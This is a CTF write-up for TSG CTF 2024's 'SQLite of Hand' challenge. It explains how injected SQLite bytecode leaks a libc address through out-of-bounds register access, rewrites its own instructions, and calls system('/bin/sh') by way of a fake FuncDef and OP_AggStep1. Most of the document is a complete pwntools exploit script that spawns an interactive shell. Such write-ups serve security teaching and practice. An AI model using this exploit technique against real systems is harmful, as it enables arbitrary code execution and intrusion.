---
title: "SQLite of Hand - TSG CTF 2024"
category: "rev"
subcategory: "heap"
type: "writeup"
tags: ["rev", "heap", "custom-vm", "sqlite", "floating-point", "hand", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "This write-up details the solution to a Capture the Flag (CTF) challenge where we could execute arbitrary SQLite bytecode."
source:
  name: "CTFtime writeup #39724"
  url: "https://ctftime.org/writeup/39724"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "SQLite of Hand"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** SQLite of Hand
- **Author team:** blue-lotus
- **CTFtime:** <https://ctftime.org/writeup/39724>

---
# WARNING: LLM Polished Content, stop reading immediately if you are allergy to text with LLM-vibe.

This write-up details the solution to a Capture the Flag (CTF) challenge where we could execute arbitrary SQLite bytecode.

**What is SQLite Bytecode?**

SQLite bytecode is a set of instructions used by the SQLite database engine's virtual machine. When you execute an SQL query, SQLite compiles it into this bytecode, which is then interpreted to perform the database operations. This bytecode defines low-level actions like opening tables, reading data, comparing values, and performing calculations, all within the context of the SQLite database.

**Challenge Overview**

The challenge provided a modified SQLite environment where we could inject our own bytecode. Although a new bytecode instruction `OP_Pack` was added, we did not utilize it in our solution.

**Our Approach**

Our strategy closely followed the methodology outlined in this blog post: [<https://gold3nboy.github.io/blog/posts/irisctf/>](<https://gold3nboy.github.io/blog/posts/irisctf/>). However, a key difference in our challenge was the limitation of executing only one bytecode sequence. This constraint required us to leak a memory address and then write it back into our bytecode program as an immediate value for subsequent use.

**Exploiting Fixed Offset on the Heap**

We exploited the fact that `stmt->amem` (which holds the SQLite virtual machine's registers) and `stmt->aOp` (which stores the bytecode instructions) are located at a fixed offset from each other on the heap. This relationship was crucial for modifying our own bytecode on the fly.

**Detailed Solution Steps**

1\. **Initial Pointer Leak:** We used out-of-bounds register access (similar to the referenced writeup) to leak an initial pointer from the program's memory.

2\. **Leaking libc Address:** We leveraged the `OP_INT64` instruction to dereference the leaked pointer, effectively reading a value from a known memory location. By targeting a pointer within the `libsqlite3` library, we obtained the base address of `libc`.

3\. **Calling system() - The Challenge:** The referenced writeup mentioned attempting to use `OP_Function` to call `system()`. However, they encountered an issue where `OP_Function` corrupted the first 8 bytes of the argument passed to `system()`, making it unusable. They opted for a one-gadget instead, but we did not have a suitable one-gadget in our environment.

4\. **Our Fix - Using OP_AggStep1:** We discovered that `OP_AggStep1`, designed for aggregate functions, behaves very similarly to `OP_Function` but without the undesirable side effect of modifying the input argument. This allowed us to successfully call `system()`.

**Solution Script Explanation**

The provided Python script automates the exploit:

```python  
from pwn import remote, process, context, gdb, flat, args

import enum  
import struct

context.log_level = "debug"  
context.arch = "amd64"

BASE = 0x2000000000  
TAIL = 0xE0 * 24  
MAX_INSTRUCTIONS_IN_PAYLOAD_STAGE1 = 10  
MAX_INSTRUCTIONS_IN_PAYLOAD_STAGE2 = 70

class P4(enum.IntEnum):  
"""  
/*  
** Allowed values of VdbeOp.p4type  
*/  
#define P4_NOTUSED 0 /* The P4 parameter is not used */  
#define P4_TRANSIENT 0 /* P4 is a pointer to a transient string */  
#define P4_STATIC (-1) /* Pointer to a static string */  
#define P4_COLLSEQ (-2) /* P4 is a pointer to a CollSeq structure */  
#define P4_INT32 (-3) /* P4 is a 32-bit signed integer */  
#define P4_SUBPROGRAM (-4) /* P4 is a pointer to a SubProgram structure */  
#define P4_TABLE (-5) /* P4 is a pointer to a Table structure */  
/* Above do not own any resources. Must free those below */  
#define P4_FREE_IF_LE (-6)  
#define P4_DYNAMIC (-6) /* Pointer to memory from sqliteMalloc() */  
#define P4_FUNCDEF (-7) /* P4 is a pointer to a FuncDef structure */  
#define P4_KEYINFO (-8) /* P4 is a pointer to a KeyInfo structure */  
#define P4_EXPR (-9) /* P4 is a pointer to an Expr tree */  
#define P4_MEM (-10) /* P4 is a pointer to a Mem* structure */  
#define P4_VTAB (-11) /* P4 is a pointer to an sqlite3_vtab structure */  
#define P4_REAL (-12) /* P4 is a 64-bit floating point value */  
#define P4_INT64 (-13) /* P4 is a 64-bit signed integer */  
#define P4_INTARRAY (-14) /* P4 is a vector of 32-bit integers */  
#define P4_FUNCCTX (-15) /* P4 is a pointer to an sqlite3_context object */  
#define P4_TABLEREF (-16) /* Like P4_TABLE, but reference counted */  
#define P4_SUBRTNSIG (-17) /* P4 is a SubrtnSig pointer */  
"""

NOTUSED = 0  
TRANSIENT = 0  
STATIC = -1  
COLLSEQ = -2  
INT32 = -3  
SUBPROGRAM = -4  
TABLE = -5  
FREE_IF_LE = -6  
DYNAMIC = -6  
FUNCDEF = -7  
KEYINFO = -8  
EXPR = -9  
MEM = -10  
VTAB = -11  
REAL = -12  
INT64 = -13  
INTARRAY = -14  
FUNCCTX = -15  
TABLEREF = -16  
SUBRTNSIG = -17

class OP(enum.IntEnum):  
Savepoint = 0  
AutoCommit = 1  
Transaction = 2  
Checkpoint = 3  
JournalMode = 4  
Vacuum = 5  
VFilter = 6  
VUpdate = 7  
Init = 8  
Goto = 9  
Gosub = 10  
InitCoroutine = 11  
Yield = 12  
MustBeInt = 13  
Jump = 14  
Once = 15  
If = 16  
IfNot = 17  
IsType = 18  
Not = 19  
IfNullRow = 20  
SeekLT = 21  
SeekLE = 22  
SeekGE = 23  
SeekGT = 24  
IfNotOpen = 25  
IfNoHope = 26  
NoConflict = 27  
NotFound = 28  
Found = 29  
SeekRowid = 30  
NotExists = 31  
Last = 32  
IfSizeBetween = 33  
SorterSort = 34  
Sort = 35  
Rewind = 36  
SorterNext = 37  
Prev = 38  
Next = 39  
IdxLE = 40  
IdxGT = 41  
IdxLT = 42  
Or = 43  
And = 44  
IdxGE = 45  
RowSetRead = 46  
RowSetTest = 47  
Program = 48  
FkIfZero = 49  
IfPos = 50  
IsNull = 51  
NotNull = 52  
Ne = 53  
Eq = 54  
Gt = 55  
Le = 56  
Lt = 57  
Ge = 58  
ElseEq = 59  
IfNotZero = 60  
DecrJumpZero = 61  
IncrVacuum = 62  
VNext = 63  
Filter = 64  
PureFunc = 65  
Function = 66  
Return = 67  
EndCoroutine = 68  
HaltIfNull = 69  
Halt = 70  
Integer = 71  
Int64 = 72  
String = 73  
BeginSubrtn = 74  
Null = 75  
SoftNull = 76  
Blob = 77  
Variable = 78  
Move = 79  
Copy = 80  
SCopy = 81  
IntCopy = 82  
FkCheck = 83  
ResultRow = 84  
CollSeq = 85  
AddImm = 86  
RealAffinity = 87  
Cast = 88  
Permutation = 89  
Compare = 90  
IsTrue = 91  
ZeroOrNull = 92  
Offset = 93  
Column = 94  
TypeCheck = 95  
Affinity = 96  
MakeRecord = 97  
Count = 98  
ReadCookie = 99  
SetCookie = 100  
ReopenIdx = 101  
OpenRead = 102  
BitAnd = 103  
BitOr = 104  
ShiftLeft = 105  
ShiftRight = 106  
Add = 107  
Subtract = 108  
Multiply = 109  
Divide = 110  
Remainder = 111  
Concat = 112  
OpenWrite = 113  
OpenDup = 114  
BitNot = 115  
OpenAutoindex = 116  
OpenEphemeral = 117  
String8 = 118  
SorterOpen = 119  
SequenceTest = 120  
OpenPseudo = 121  
Close = 122  
ColumnsUsed = 123  
SeekScan = 124  
SeekHit = 125  
Sequence = 126  
NewRowid = 127  
Insert = 128  
RowCell = 129  
Delete = 130  
ResetCount = 131  
SorterCompare = 132  
SorterData = 133  
RowData = 134  
Rowid = 135  
NullRow = 136  
SeekEnd = 137  
IdxInsert = 138  
SorterInsert = 139  
IdxDelete = 140  
DeferredSeek = 141  
IdxRowid = 142  
FinishSeek = 143  
Destroy = 144  
Clear = 145  
ResetSorter = 146  
CreateBtree = 147  
SqlExec = 148  
ParseSchema = 149  
LoadAnalysis = 150  
DropTable = 151  
DropIndex = 152  
DropTrigger = 153  
Real = 154  
IntegrityCk = 155  
RowSetAdd = 156  
Param = 157  
FkCounter = 158  
MemMax = 159  
OffsetLimit = 160  
AggInverse = 161  
AggStep = 162  
AggStep1 = 163  
AggValue = 164  
AggFinal = 165  
Expire = 166  
CursorLock = 167  
CursorUnlock = 168  
TableLock = 169  
VBegin = 170  
VCreate = 171  
VDestroy = 172  
VOpen = 173  
VCheck = 174  
VInitIn = 175  
VColumn = 176  
VRename = 177  
Pagecount = 178  
MaxPgcnt = 179  
ClrSubtype = 180  
GetSubtype = 181  
SetSubtype = 182  
FilterAdd = 183  
Trace = 184  
CursorHint = 185  
ReleaseReg = 186  
Noop = 187  
Explain = 188  
Abortable = 189

def op(opcode: OP, p1=0, p2=0, p3=0, p4type: P4 = P4.NOTUSED, p4=0, p5=0):  
assert -(2**31) <= p1 < 2**31  
assert -(2**31) <= p2 < 2**31  
assert -(2**31) <= p3 < 2**31  
assert 0 <= p4 < 2**64  
assert 0 <= p5 < 2**16  
return struct.pack("<BbHiiiQ", int(opcode), int(p4type), p5, p1, p2, p3, p4)

def read8(dst, addr):  
return op(OP.Int64, p1=dst, p4type=P4.INT64, p4=addr)

def intcopy(dst, src):  
return op(OP.IntCopy, p2=dst, p1=src)

def add_imm(dst, value):  
return op(OP.AddImm, p1=dst, p2=value)

def debug():  
return op(OP.Pagecount)

"""  
aMem = 0x558e2f795470,  
apArg = 0x558e2f795470,  
apCsr = 0x558e2f795470,  
aVar = 0x558e2f795470,  
aOp = 0x558e2f7ae350,  
"""

HEAP_BASE_TO_AMEM = 0xB470  
AMEM_TO_AOP = 0x18EE0  
HEAP_BASE_TO_AOP = HEAP_BASE_TO_AMEM + AMEM_TO_AOP  
LIBC_GETENV_OFFSET = 0x487A0  
LIBC_SYSTEM_OFFSET = 0x58740

def compute_aop_overwrite_offset(target_pc):  
# int_copy writes to value+0, then changes a u16 at +20  
# we want to overwrite p4 at op+16; p3 of the next instruction will be trashed  
# ... which is totally fine  
offset_amem = (AMEM_TO_AOP + 55) // 56  
cur = offset_amem * 56 - AMEM_TO_AOP  
while cur % 24 != 16:  
cur += 56  
offset_amem += 1  
actual_pc = cur // 24  
while actual_pc < target_pc:  
offset_amem += 3  
actual_pc += 7  
return offset_amem, actual_pc

amem_offset_to_op_int64, op_int64_pc = compute_aop_overwrite_offset(  
MAX_INSTRUCTIONS_IN_PAYLOAD_STAGE1  
)

payload = [  
intcopy(1, -799),  
# -827442 - 61440: to libsqlite3 base; +0x103000: .got getenv  
add_imm(1, -827442 - 61440 + 0x103000),  
intcopy(amem_offset_to_op_int64, 1),  
]  
assert len(payload) < op_int64_pc  
while len(payload) < op_int64_pc:  
payload.append(op(OP.Noop))  
payload.append(read8(0, 0x6161616161616161))

amem_offset_to_op_function, op_function_pc = compute_aop_overwrite_offset(  
MAX_INSTRUCTIONS_IN_PAYLOAD_STAGE2  
)  
amem_offset_to_end_of_payload = amem_offset_to_op_function + 2

print(f"{amem_offset_to_end_of_payload=}")  
payload += [  
add_imm(0, -LIBC_GETENV_OFFSET + LIBC_SYSTEM_OFFSET),  
# system() in 0 now  
# Make it address to call  
intcopy(amem_offset_to_end_of_payload, 0), # system  
# op(OP.Integer, p2=amem_offset_to_end_of_payload, p1=0x41414141),  
# ----------------------  
intcopy(1, 2),  
add_imm(1, -752),  
intcopy(0, 1),  
# 24: offsetof(xSFunc, FuncDef)  
add_imm(0, HEAP_BASE_TO_AMEM + amem_offset_to_end_of_payload * 56 - 24),  
intcopy(amem_offset_to_end_of_payload + 1, 0),  
intcopy(0, 1),  
add_imm(0, HEAP_BASE_TO_AMEM + (amem_offset_to_end_of_payload + 1) * 56 - 8),  
intcopy(amem_offset_to_op_function, 0),  
# debug(),  
]

assert len(payload) < op_function_pc  
while len(payload) < op_function_pc:  
payload.append(op(OP.Noop))  
payload += [  
op(OP.AggStep1, p4type=P4.FUNCDEF, p4=0x4242424242424242),  
]  
payload = b"".join(payload)  
tail = flat([0x4141414141414141])  
payload = flat(  
{0: payload, 1928: b"/bin/sh\x00", TAIL: tail},  
length=0x100 * 24 - 1,  
)

# r = process("./chall", env={"LD_LIBRARY_PATH": "."})  
if args.REMOTE:  
r = remote(args.HOST, args.PORT)  
else:  
r = process("./chall")  
r.sendlineafter(b"size> ", str(len(payload)).encode())  
gdbscript = """  
# b sqlite3VdbeExec  
b *(sqlite3VdbeExec+0x23f3)  
b *(sqlite3VdbeExec+0x12bc)  
"""  
if not args.REMOTE:  
gdb.attach(r, gdbscript)  
r.sendafter(b"your bytecode> ", payload)  
r.interactive()  
```

* **Constants and Enums:** Defines constants like memory addresses and enumerations (`P4` and `OP`) for SQLite bytecode parameter types and opcodes, respectively. These improve code readability and maintainability.  
* **Helper Functions:** `op()`, `read8()`, `intcopy()`, `add_imm()`, and `debug()` create bytecode instructions.  
* **Heap and Offset Calculations:** Computes offsets between `amem`, `aOp`, and relevant function addresses within `libc` (`getenv` and `system`).  
* **`compute_aop_overwrite_offset()`:** This function is the core of our bytecode self-modification. It calculates the precise register index needed to overwrite a specific instruction's `p4` field (which often holds a pointer or immediate value).  
* **Payload Construction (Stage 1):**  
* Calculates the address of the `getenv` function in the Global Offset Table (GOT) of `libsqlite3`.  
* Uses `intcopy` and `add_imm` to place this address into the correct `amem` register so that in the next step we can overwrite an instruction's `p4` field with this address.  
* Appends `read8(0, 0x6161616161616161)` to read 8 bytes starting from a placeholder address. This instruction will be overwritten in the next step.  
* **Payload Construction (Stage 2):**  
* Calculates the address of `system` using the previously leaked `getenv` address.  
* Constructs a fake `FuncDef` structure (used by `OP_Function` and `OP_AggStep1`) that points to `system`.  
* Constructs a fake `sqlite3_context` structure that points to the fake `FuncDef`.  
* Places the address of "/bin/sh" in the appropriate location for `system` to use.  
* Uses `OP_AggStep1` to call `system` with the crafted structures.  
* **Final Payload Assembly:** Combines the generated bytecode with padding and the "/bin/sh" string to create the final payload.  
* **Interaction:** Sends the payload to the challenge server and establishes an interactive shell.
